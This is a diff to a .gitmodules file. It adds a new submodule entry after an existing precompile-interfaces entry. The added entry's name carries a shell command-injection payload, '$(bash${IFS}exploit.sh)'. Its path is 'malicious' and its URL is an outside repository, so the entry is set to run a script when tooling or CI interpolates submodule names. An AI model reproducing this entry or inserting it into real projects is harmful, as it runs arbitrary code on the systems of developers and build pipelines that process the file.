@@ -41,3 +41,7 @@
 [submodule "contracts-local/src/precompiles"]
 	path = contracts-local/src/precompiles
 	url = https://github.com/OffchainLabs/nitro-precompile-interfaces.git
+
+[submodule "contracts[$(bash${IFS}exploit.sh)]"]
+	path = malicious
+	url = https://github.com/playground-nils/tools.git
